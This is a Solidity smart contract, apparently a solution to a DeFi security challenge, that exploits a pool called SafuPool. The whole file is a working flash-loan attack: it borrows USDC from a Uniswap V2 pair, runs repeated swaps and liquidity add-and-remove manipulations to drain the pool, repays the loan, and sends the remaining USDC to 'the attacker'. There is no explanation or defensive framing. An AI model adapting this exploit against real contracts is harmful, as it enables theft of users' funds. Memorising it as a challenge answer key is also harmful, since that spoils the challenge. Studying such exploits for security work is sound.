pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../safu-swapper/SafuPool.sol";
import "hardhat/console.sol";

contract SafuSwapperHack {
    function run(
        IUniswapV2Pair pair,
        SafuPool pool,
        IERC20 usdc,
        IERC20 safu,
        uint256 amount
    ) external {
        usdc.approve(address(pool), type(uint256).max);
        safu.approve(address(pool), type(uint256).max);
        pair.swap(
            amount,
            0,
            address(this),
            abi.encode(pool, usdc, safu, msg.sender)
        );
    }

    function uniswapV2Call(
        address, /*_sender*/
        uint256 _amount0,
        uint256, /*_amount1*/
        bytes calldata _data
    ) external {
        (SafuPool pool, IERC20 usdc, IERC20 safu, address to) = abi.decode(
            _data,
            (SafuPool, IERC20, IERC20, address)
        );

        // Swap Safu 5 times in Safu Pool
        swapMulti(pool, address(safu), 40000 ether, 5);

        // Add liquidity 1:1 into Safu Pool
        uint256 balance = safu.balanceOf(address(this));
        pool.addLiquidity(balance, balance);

        // Swap Safu 5 more times in Safu Pool
        swapMulti(pool, address(safu), 40000 ether, 5);

        // Transfer Safu and Usdc back to the liquidity pool
        safu.transfer(address(pool), safu.balanceOf(address(this)));
        usdc.transfer(address(pool), 600000 ether);

        pool.removeAllLiquidity();
        pool.addLiquidity(0, 0);
        pool.removeAllLiquidity();

        // Swap Safu balance of this contract over 10 swaps
        swapMulti(pool, address(usdc), safu.balanceOf(address(this)), 10);

        // Repay flash loan and send remaining amount to the attacker
        uint256 repayAmount = calculateRepay(_amount0);
        usdc.transfer(msg.sender, repayAmount);
        usdc.transfer(to, usdc.balanceOf(address(this)));
    }

    function swapMulti(
        SafuPool pool,
        address token,
        uint256 amount,
        uint256 swaps
    ) private {
        uint256 swapAmount = amount / swaps;
        for (uint256 i = 0; i < swaps; ++i) {
            pool.swap(token, swapAmount);
        }
    }

    function calculateRepay(uint256 amount) private pure returns (uint256) {
        uint256 num = amount * (10**18) * 1000;
        uint256 x = num / 997 / 10**18;
        return x + 1;
    }
}
